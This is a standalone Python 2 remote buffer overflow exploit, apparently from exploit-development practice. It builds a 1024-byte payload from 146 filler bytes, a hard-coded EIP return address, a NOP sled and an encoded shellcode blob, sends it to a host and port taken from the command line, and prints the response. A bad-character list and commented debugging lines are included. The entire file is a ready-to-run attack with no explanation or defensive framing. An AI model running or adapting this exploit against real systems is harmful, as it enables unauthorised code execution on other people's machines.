#!/usr/bin/python2
import socket, sys, time, struct
if len(sys.argv) < 2:
    print("[-] USAGE: %s <RHOST> <RPORT> <int_bytes> "% sys.argv[0] + "\r")
    sys.exit(1)

rmchars = "\x0a\x00"
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

rhost = sys.argv[1]
rport = int(sys.argv[2])
offset = 146
totalPayloadSize = 1024
end = '\r\n'

buf = '\x41' * offset
#buf += struct.pack('<L', 0x080414c3) # eip return, in little endian mode
buf += struct.pack('<L', 0x080416bf) # eip return, in little endian mode
buf += "\x90" * 15 # nop sled
############### SHELLCODE #####################
buf += "\xb8\xc7\xfc\x26\x7a\xdb\xc4\xd9\x74\x24\xf4\x5a\x31"
buf += "\xc9\xb1\x31\x31\x42\x13\x03\x42\x13\x83\xc2\xc3\x1e"
buf += "\xd3\x86\x23\x5c\x1c\x77\xb3\x01\x94\x92\x82\x01\xc2"
buf += "\xd7\xb4\xb1\x80\xba\x38\x39\xc4\x2e\xcb\x4f\xc1\x41"
buf += "\x7c\xe5\x37\x6f\x7d\x56\x0b\xee\xfd\xa5\x58\xd0\x3c"
buf += "\x66\xad\x11\x79\x9b\x5c\x43\xd2\xd7\xf3\x74\x57\xad"
buf += "\xcf\xff\x2b\x23\x48\xe3\xfb\x42\x79\xb2\x70\x1d\x59"
buf += "\x34\x55\x15\xd0\x2e\xba\x10\xaa\xc5\x08\xee\x2d\x0c"
buf += "\x41\x0f\x81\x71\x6e\xe2\xdb\xb6\x48\x1d\xae\xce\xab"
buf += "\xa0\xa9\x14\xd6\x7e\x3f\x8f\x70\xf4\xe7\x6b\x81\xd9"
buf += "\x7e\xff\x8d\x96\xf5\xa7\x91\x29\xd9\xd3\xad\xa2\xdc"
buf += "\x33\x24\xf0\xfa\x97\x6d\xa2\x63\x81\xcb\x05\x9b\xd1"
buf += "\xb4\xfa\x39\x99\x58\xee\x33\xc0\x36\xf1\xc6\x7e\x74"
buf += "\xf1\xd8\x80\x28\x9a\xe9\x0b\xa7\xdd\xf5\xd9\x8c\x02"
buf += "\x14\xc8\xf8\xaa\x81\x99\x41\xb7\x31\x74\x85\xce\xb1"
buf += "\x7d\x75\x35\xa9\xf7\x70\x71\x6d\xeb\x08\xea\x18\x0b"
buf += "\xbf\x0b\x09\x68\x5e\x98\xd1\x41\xc5\x18\x73\x9e"
###############################################
#buf += '\xCC' * 30 # debug flag 
#buf += badchars
buf += '\x41' * (totalPayloadSize - len(buf) - len(end))


payload = buf + end


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((rhost, rport))
except:
    print("[-] Could not connect to %s"% rhost + ":%s"% rport)
    sys.exit(1)

try:
    print("[+] Sending %s"% len(payload) + " bytes." )
    s.send(payload)
    time.sleep(0.2)
    s.shutdown(socket.SHUT_WR)

except:
    print("[-] Send data failed.")
    sys.exit(1)


try: 
    data = ""
    while True:
        datum = s.recv(2)
        if not datum: break
        data += datum
    print(data)

except:
    print("[-] Receive data failed.")
    sys.exit(1)
finally:
    s.close()

sys.exit(0)
